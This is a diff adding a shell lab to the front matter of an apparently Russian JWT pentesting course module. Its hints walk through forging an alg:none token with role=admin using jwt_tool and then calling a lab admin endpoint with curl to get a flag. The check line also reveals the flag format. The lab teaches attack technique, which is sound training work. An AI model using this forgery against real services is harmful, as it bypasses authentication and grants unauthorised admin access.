@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 40
 summary: "Практический workflow по JWT: декодирование, none/alg-confusion, взлом HS256 через hashcat/john, подделка и jwk/jku/kid-инъекции."
+lab:
+  kind: shell
+  title: "Практика: подделка JWT через alg:none"
+  toolset: [core, python3, curl]
+  workdir: /home/student/task
+  files: [task.md, token.txt]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Токен лежит в `token.txt`: `cat token.txt`, затем разбери его `python3 jwt_tool.py token.txt`."
+    - "В payload видно `role:user`. Собери токен с `alg:none` и `role=admin`."
+    - "`python3 jwt_tool.py token.txt -I -pc role -pv admin -S none` выдаст подделанный токен."
+    - "Используй его: `curl -s https://shop.acme-lab.test/admin -H 'Authorization: Bearer <токен>'` — Admin panel с флагом. Сохрани в `found.txt` и `check`."
 ---
 
 ## Задача
